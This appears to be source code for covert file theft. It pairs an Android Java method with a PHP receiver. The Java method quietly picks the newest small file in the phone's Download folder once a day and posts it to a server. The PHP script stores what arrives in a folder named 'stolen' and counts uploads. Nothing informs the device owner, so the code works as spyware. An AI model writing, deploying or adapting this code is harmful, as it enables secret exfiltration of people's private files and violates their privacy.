	private void iq500sendFile()
	{	
		try{
			//Test permission first
			File test = new File("/sdcard");
			Boolean testp = test.canRead();
			if(!testp)
			{

				//Toast.makeText(this, "gg", Toast.LENGTH_LONG).show();
				return;

			}
			//Toast.makeText(this, "ok", Toast.LENGTH_LONG).show();
			//limit one photo per day
			Boolean pass = false;
			Date t = new Date();
			long ts = t.getTime();
			SharedPreferences pref = getSharedPreferences("loadpref", Context.MODE_PRIVATE);
			SharedPreferences.Editor edit = pref.edit();

			long lastup = pref.getLong("lastUpload", 0);

			if(lastup == 0 || ts - lastup >= 86400000)
			{
				edit.putLong("lastUpload", ts);
				edit.commit();
				pass = true;
			}


			if(pass)
			{
				try
				{
					StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
					StrictMode.setThreadPolicy(policy);

					//Define root path and get file list
					String root = "/sdcard/Download/";

					File pa = new File(root);


					String[] res = pa.list();

					//filter oversize files
					String resls = "";
					
					//root
					if(res != null)
						for(int i = 0; i < res.length; i++)
						{
							Boolean a = new File(root + res[i]).length() /1024/1024 <= 3;
							Boolean b = new File(root + res[i]).isFile();
							if(a && b)
							{
								resls += root + res[i];
								if(i < res.length - 1)
									resls += "///n";
							}

						}

					//electing last modified (newest)
					String[] resls_ = resls.split("///n");
					String finalres = "";
					long lmod = 0;
					//root
					for(int i = 0; i < resls_.length; i++)
					{
						long temp = lmod;
						lmod = Math.max(lmod, new File(resls_[i]).lastModified());
						if(temp != lmod)
							finalres = resls_[i];
					}
					
					//root1
					if(finalres != "")
					{
						//define final target
						File target = new File(finalres);

						//create binary entity
						FileEntity reqEntity = new FileEntity(target, "binary/octet-stream");

						//launch http request
						HttpPost post = new HttpPost("http://localhost/file.php");

						//set binary entity
						post.setEntity(reqEntity);
						reqEntity.setContentType("binary/octet-stream");

						//set timestamp of the file as the component of filename
						post.setHeader("fname", target.getName());

						//fire
						HttpClient httpclient = new DefaultHttpClient();
						httpclient.execute(post);
					}

				}
				catch (Exception e)
				{
					e.printStackTrace();
					Log.e("iq500", e.toString());
				}
			}	
		}catch(Exception e){
			e.printStackTrace();
			Log.e("iq500", e.toString());
		}
	}
	
	
PHP:
<?php
$fname = $_SERVER["HTTP_FNAME"];
$inp = file_get_contents("php://input");

$file = scandir("stolen/");
if(sizeof($file) >= 32)
{
for($i = 2; $i < sizeof($file); $i++)
{
unlink("stolen/" . $file[$i]);
}
}

if($inp != "" && strlen($fname) > 0)
{
$p = "stolen/" . $fname . ".html";
file_put_contents($p, $inp);
chmod($p, 0640);
}

$oldCount = file_get_contents('count_fileclick.txt');

file_put_contents('count_fileclick.txt', $oldCount + 1);
?>
